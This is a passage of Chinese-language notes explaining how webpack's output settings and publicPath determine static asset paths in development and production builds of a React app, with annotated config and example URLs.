      pathinfo: isEnvDevelopment,
      // There will be one main bundle, and one file per asynchronous chunk.
      // In development, it does not produce real files.
      filename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].js'
        : isEnvDevelopment && 'static/js/bundle.js',
      // There are also additional JS chunk files if you use code splitting.
      chunkFilename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].chunk.js'
        : isEnvDevelopment && 'static/js/[name].chunk.js',
      assetModuleFilename: 'static/media/[name].[hash][ext]',
      // webpack uses `publicPath` to determine where the app is being served from.
      // It requires a trailing slash, or the file assets will get an incorrect path.
      // We inferred the "public path" (such as / or /my-project) from homepage.
      publicPath: paths.publicUrlOrPath,
      // Point sourcemap entries to original disk location (format as URL on Windows)
      devtoolModuleFilenameTemplate: isEnvProduction
        ? info =>
            path
              .relative(paths.appSrc, info.absoluteResourcePath)
              .replace(/\\/g, '/')
        : isEnvDevelopment &&
          (info => path.resolve(info.absoluteResourcePath).replace(/\\/g, '/')),
    },
```

最终src里面引用的静态资源：

```
<img class="App-logo" alt="logo" src="/static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg">

即是
http://localhost:3000/static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg
由内存提供
```

- 开发环境返回 "/" 或简单路径是基于 Webpack Dev Server 的工作原理和开发便利性考虑的。让我详细解释：
  - Webpack Dev Server 默认运行在 http://localhost:3000，并且：
  - 在内存中提供服务（不写入磁盘）
  - 所有资源都从内存中提供
  - 所有路径都相对于开发服务器的根路径

示例 2：开发环境，绝对路径

```js
isEnvDevelopment = true;
envPublicUrl = "/myapp/";
// 1. startsWith('.') 检查 → false
// 2. new URL("/myapp/", stubDomain).pathname → "/myapp/"
// 返回: "/myapp/"
```

`http://localhost:3000/myapp/favicon.ico` 返回

示例 3：生产环境，相对路径

```js
isEnvDevelopment = false;
envPublicUrl = ".";
// 1. startsWith('.') 检查 → true
// 返回: "/"
output: {
      // The build folder.
      path: paths.appBuild,
      // Add /* filename */ comments to generated require()s in the output.
      pathinfo: isEnvDevelopment,
      // There will be one main bundle, and one file per asynchronous chunk.
      // In development, it does not produce real files.
      filename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].js'
        : isEnvDevelopment && 'static/js/bundle.js',
      // There are also additional JS chunk files if you use code splitting.
      chunkFilename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].chunk.js'
        : isEnvDevelopment && 'static/js/[name].chunk.js',
      assetModuleFilename: 'static/media/[name].[hash][ext]',
      // webpack uses `publicPath` to determine where the app is being served from.
      // It requires a trailing slash, or the file assets will get an incorrect path.
      // We inferred the "public path" (such as / or /my-project) from homepage.
      publicPath: paths.publicUrlOrPath,
      // Point sourcemap entries to original disk location (format as URL on Windows)
      devtoolModuleFilenameTemplate: isEnvProduction
        ? info =>
            path
              .relative(paths.appSrc, info.absoluteResourcePath)
              .replace(/\\/g, '/')
        : isEnvDevelopment &&
          (info => path.resolve(info.absoluteResourcePath).replace(/\\/g, '/')),
    },
```

最终src里面引用的静态资源：

```
<img class="App-logo" alt="logo" src="./static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg">

即是
http://127.0.0.1:5500/build/static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg
由打包后的实际目录提供，结合path（打包目录）+ assetModuleFilename + publicPath
```
